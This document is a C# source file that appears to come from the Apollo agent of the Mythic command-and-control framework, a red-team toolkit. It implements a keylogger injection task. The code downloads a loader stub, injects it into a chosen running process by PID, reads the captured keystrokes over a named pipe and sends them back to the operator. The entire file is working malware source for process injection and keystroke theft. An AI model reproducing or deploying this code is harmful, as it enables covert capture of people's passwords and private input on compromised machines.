#define COMMAND_NAME_UPPER

#if DEBUG
#define KEYLOG_INJECT
#endif

#if KEYLOG_INJECT

using ApolloInterop.Classes;
using ApolloInterop.Classes.Collections;
using ApolloInterop.Classes.Core;
using ApolloInterop.Classes.Events;
using ApolloInterop.Enums.ApolloEnums;
using ApolloInterop.Interfaces;
using ApolloInterop.Serializers;
using ApolloInterop.Structs.ApolloStructs;
using ApolloInterop.Structs.MythicStructs;
using System;
using System.Collections.Concurrent;
using System.Collections.Generic;
using System.IO.Pipes;
using System.Linq;
using System.Runtime.Serialization;
using System.Text;
using System.Threading;
using ST = System.Threading.Tasks;

namespace Tasks
{
    public class keylog_inject : Tasking
    {
        [DataContract]
        internal struct KeylogInjectParameters
        {
            [DataMember(Name = "pipe_name")]
            public string PipeName;
            [DataMember(Name = "loader_stub_id")]
            public string LoaderStubId;
            [DataMember(Name = "pid")]
            public int PID;
        }
        private ConcurrentDictionary<string, ChunkedMessageStore<IPCChunkedData>> MessageStore = new ConcurrentDictionary<string, ChunkedMessageStore<IPCChunkedData>>();
        private AutoResetEvent _senderEvent = new AutoResetEvent(false);
        private AutoResetEvent _receiverEvent = new AutoResetEvent(false);
        private AutoResetEvent _putFilesEvent = new AutoResetEvent(false);
        private AutoResetEvent _pipeConnected = new AutoResetEvent(false);

        private ConcurrentQueue<byte[]> _senderQueue = new ConcurrentQueue<byte[]>();
        private ThreadSafeList<KeylogInformation> _keylogs = new ThreadSafeList<KeylogInformation>();
        private ConcurrentQueue<byte[]> _putFilesQueue = new ConcurrentQueue<byte[]>();
        private ConcurrentQueue<IMythicMessage> _receiverQueue = new ConcurrentQueue<IMythicMessage>();
        private JsonSerializer _serializer = new JsonSerializer();
        private AutoResetEvent _complete = new AutoResetEvent(false);
        private Action<object> _putKeylogsAction;
        List<ST.Task<bool>> uploadTasks = new List<ST.Task<bool>>();

        private bool _completed = false;

        public keylog_inject(IAgent agent, ApolloInterop.Structs.MythicStructs.Task data) : base(agent, data)
        {
            _putKeylogsAction = (object p) =>
            {
                PipeStream ps = (PipeStream)p;
                WaitHandle[] waiters = new WaitHandle[] { _cancellationToken.Token.WaitHandle, _complete };
                while (!_cancellationToken.IsCancellationRequested && !_completed)
                {
                    WaitHandle.WaitAny(waiters, 10000);
                    KeylogInformation[] keylogs = _keylogs.Flush();
                    if (keylogs.Length > 0)
                    {
                        _agent.GetTaskManager().AddTaskResponseToQueue(new TaskResponse
                        {
                            TaskID = _data.ID,
                            Keylogs = keylogs
                        });
                    }
                }
                ps.Close();
            };
        }


        public override void Start()
        {
            TaskResponse resp;
            try
            {
                KeylogInjectParameters parameters = _jsonSerializer.Deserialize<KeylogInjectParameters>(_data.Parameters);
                if (string.IsNullOrEmpty(parameters.LoaderStubId) ||
                    string.IsNullOrEmpty(parameters.PipeName))
                {
                    resp = CreateTaskResponse(
                        $"One or more required arguments was not provided.",
                        true,
                        "error");
                }
                else
                {
                    bool pidRunning = false;
                    try
                    {
                        System.Diagnostics.Process.GetProcessById(parameters.PID);
                        pidRunning = true;
                    }
                    catch
                    {
                        pidRunning = false;
                    }

                    if (pidRunning)
                    {
                        if (_agent.GetFileManager().GetFile(_cancellationToken.Token, _data.ID, parameters.LoaderStubId,
                                out byte[] exeAsmPic))
                        {
                            var injector = _agent.GetInjectionManager().CreateInstance(exeAsmPic, parameters.PID);
                            if (injector.Inject())
                            {
                                _agent.GetTaskManager().AddTaskResponseToQueue(CreateTaskResponse(
                                    "",
                                    false,
                                    "",
                                    new IMythicMessage[]
                                    {
                                        Artifact.ProcessInject(parameters.PID,
                                            _agent.GetInjectionManager().GetCurrentTechnique().Name)
                                    }));
                                AsyncNamedPipeClient client = new AsyncNamedPipeClient("127.0.0.1", parameters.PipeName);
                                client.ConnectionEstablished += Client_ConnectionEstablished;
                                client.MessageReceived += OnAsyncMessageReceived;
                                client.Disconnect += Client_Disconnect;
                                if (client.Connect(3000))
                                {
                                    WaitHandle[] waiters = new WaitHandle[]
                                    {
                                        _complete,
                                        _cancellationToken.Token.WaitHandle
                                    };
                                    WaitHandle.WaitAny(waiters);
                                    resp = CreateTaskResponse("", true, "completed");
                                }
                                else
                                {
                                    resp = CreateTaskResponse($"Failed to connect to named pipe.", true, "error");
                                }
                            }
                            else
                            {
                                resp = CreateTaskResponse($"Failed to inject into PID {parameters.PID}", true, "error");
                            }
                        }
                        else
                        {
                            resp = CreateTaskResponse(
                                $"Failed to download assembly loader stub (with id: {parameters.LoaderStubId})",
                                true,
                                "error");
                        }
                    }
                    else
                    {
                        resp = CreateTaskResponse(
                            $"Process with ID {parameters.PID} is not running.",
                            true,
                            "error");
                    }
                }
            }
            catch (Exception ex)
            {
                resp = CreateTaskResponse($"Unexpected error: {ex.Message}\n\n{ex.StackTrace}", true, "error");
            }

            _agent.GetTaskManager().AddTaskResponseToQueue(resp);
        }

        private void Client_Disconnect(object sender, NamedPipeMessageArgs e)
        {
            e.Pipe.Close();
            _completed = true;
            _complete.Set();
        }

        private void Client_ConnectionEstablished(object sender, NamedPipeMessageArgs e)
        {
            System.Threading.Tasks.Task.Factory.StartNew(_putKeylogsAction, e.Pipe, _cancellationToken.Token);
        }

        private void OnAsyncMessageReceived(object sender, NamedPipeMessageArgs args)
        {
            IPCChunkedData chunkedData = _jsonSerializer.Deserialize<IPCChunkedData>(
                Encoding.UTF8.GetString(args.Data.Data.Take(args.Data.DataLength).ToArray()));
            lock (MessageStore)
            {
                if (!MessageStore.ContainsKey(chunkedData.ID))
                {
                    MessageStore[chunkedData.ID] = new ChunkedMessageStore<IPCChunkedData>();
                    MessageStore[chunkedData.ID].MessageComplete += DeserializeToReceiverQueue;
                }
            }
            MessageStore[chunkedData.ID].AddMessage(chunkedData);
        }

        private void DeserializeToReceiverQueue(object sender, ChunkMessageEventArgs<IPCChunkedData> args)
        {
            MessageType mt = args.Chunks[0].Message;
            List<byte> data = new List<byte>();

            for (int i = 0; i < args.Chunks.Length; i++)
            {
                data.AddRange(Convert.FromBase64String(args.Chunks[i].Data));
            }

            IMythicMessage msg = _jsonSerializer.DeserializeIPCMessage(data.ToArray(), mt);
            //Console.WriteLine("We got a message: {0}", mt.ToString());

            if (msg.GetTypeCode() != MessageType.KeylogInformation)
            {
                throw new Exception("Invalid type received from the named pipe!");
            }
            _keylogs.Add((KeylogInformation)msg);
        }
    }
}
#endif